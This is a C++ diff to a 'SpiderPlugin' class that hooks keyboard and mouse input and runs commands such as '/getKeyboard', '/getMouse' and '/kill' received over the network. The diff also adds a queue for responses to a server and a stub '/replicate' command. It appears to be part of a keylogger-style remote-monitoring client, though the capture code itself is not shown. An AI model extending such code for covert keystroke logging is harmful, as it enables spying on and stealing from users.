@@ -18,7 +18,7 @@ namespace library
 mt::Queue<SystemMsg> *SpiderPlugin::m_sendToNetwork = nullptr;
 
 SpiderPlugin::SpiderPlugin() : m_infos{}, m_keyboardHook(false), m_mouseHook(false),
-                               m_receivedFromNetwork(),
+                               m_receivedFromNetwork(), m_networkResponseQueue(),
                                m_cmd {}
 #if defined _WIN32
 ,
@@ -26,9 +26,11 @@ SpiderPlugin::SpiderPlugin() : m_infos{}, m_keyboardHook(false), m_mouseHook(fal
     m_mouseHookWin(nullptr)
 #endif
 {
-    m_cmd["/getInfos"] = [this]() { getInfos(); };
+    m_cmd["/getInfo"] = [this]() { getInfos(); };
     m_cmd["/getKeyboard"] = [this]() { getKeyboard(); };
     m_cmd["/getMouse"] = [this]() { getMouse(); };
+    m_cmd["/kill"] = [this]() { kill(); };
+    m_cmd["/replicate"] = []() {};
 }
 
 SpiderPlugin::~SpiderPlugin()
@@ -53,6 +55,12 @@ bool SpiderPlugin::init(mt::Queue<SystemMsg> &inputQueue)
 mt::Queue<SpiderPlugin::Order> &SpiderPlugin::getOrderQueue()
 {
     return m_receivedFromNetwork;
+}
+
+// Get the message thread-safe queue, in order to response to the server
+mt::Queue<std::string> &SpiderPlugin::getReponseQueue()
+{
+    return m_networkResponseQueue;
 }
 
 bool SpiderPlugin::deinit()
@@ -139,6 +147,12 @@ void SpiderPlugin::exec(Order const &order)
     {
         m_cmd[order]();
     }
+}
+
+bool SpiderPlugin::kill()
+{
+    m_networkResponseQueue.push("KO\r\n");
+    return true;
 }
 
 void SpiderPlugin::run()
